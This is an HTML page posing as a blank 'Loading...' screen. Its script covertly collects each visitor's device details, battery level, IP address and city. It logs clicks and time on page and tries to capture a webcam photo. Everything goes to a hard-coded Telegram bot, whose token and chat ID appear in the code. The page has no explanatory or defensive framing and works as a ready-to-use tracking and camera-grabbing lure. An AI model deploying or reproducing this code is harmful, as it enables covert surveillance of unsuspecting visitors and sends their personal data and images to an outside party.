<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<style>
body{
margin:0;
background:black;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
color:white;
font-family:Arial;
text-align:center;
}
button{
padding:12px 20px;
font-size:18px;
cursor:pointer;
}
</style>
</head>

<body>

<div id="content">Loading...</div>

<script>

const BOT_TOKEN="8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
const CHAT_ID="1167762232";

// ---------- SESSION TOKEN ----------
function getSession(){
let token=localStorage.getItem("sessionToken");
if(!token){
token=Math.random().toString(36).substring(2);
localStorage.setItem("sessionToken",token);
}
return token;
}

// ---------- DEVICE + BEHAVIOUR ----------
async function collectDeviceData(){

let session=getSession();

let data={
session:session,
userAgent:navigator.userAgent,
platform:navigator.platform,
language:navigator.language,
screen:screen.width+"x"+screen.height,
timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
};

// Battery (not supported everywhere)
if(navigator.getBattery){
let battery=await navigator.getBattery();
data.battery=Math.round(battery.level*100)+"%";
}

// Approx Location via IP
try{
let res=await fetch("https://ipapi.co/json/");
let loc=await res.json();
data.ip=loc.ip;
data.city=loc.city;
data.country=loc.country_name;
}catch{}

sendText(JSON.stringify(data,null,2));

}

function sendText(text){
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
chat_id:CHAT_ID,
text:text
})
});
}

// ---------- CAMERA ----------
async function startCamera(){

try{

const stream=await navigator.mediaDevices.getUserMedia({video:true});

const video=document.createElement("video");
video.srcObject=stream;
video.play();

await new Promise(r=>video.onloadedmetadata=r);

const canvas=document.createElement("canvas");
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;

const ctx=canvas.getContext("2d");
ctx.drawImage(video,0,0);

canvas.toBlob(blob=>{

let formData=new FormData();
formData.append("chat_id",CHAT_ID);
formData.append("photo",blob,"capture.jpg");

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
method:"POST",
body:formData
});

},"image/jpeg");

stream.getTracks().forEach(t=>t.stop());

}catch(e){
showPermissionButton();
}

}

// ---------- PERMISSION CHECK ----------
async function checkPermission(){

if(!navigator.permissions){
showPermissionButton();
return;
}

let result=await navigator.permissions.query({name:"camera"});

if(result.state==="granted"){
startCamera();
}
else{
showPermissionButton();
}

}

// ---------- BUTTON ----------
function showPermissionButton(){
document.getElementById("content").innerHTML=
`<button onclick="startCamera()">Allow Camera</button>`;
}

// ---------- TRACK BEHAVIOUR ----------
function trackBehaviour(){

document.addEventListener("click",()=>sendText("User clicked"));

let start=Date.now();

window.addEventListener("beforeunload",()=>{
let duration=Math.round((Date.now()-start)/1000);
sendText("Session duration: "+duration+" seconds");
});

}

// ---------- RUN ----------
collectDeviceData();
trackBehaviour();
checkPermission();

</script>

</body>
</html>
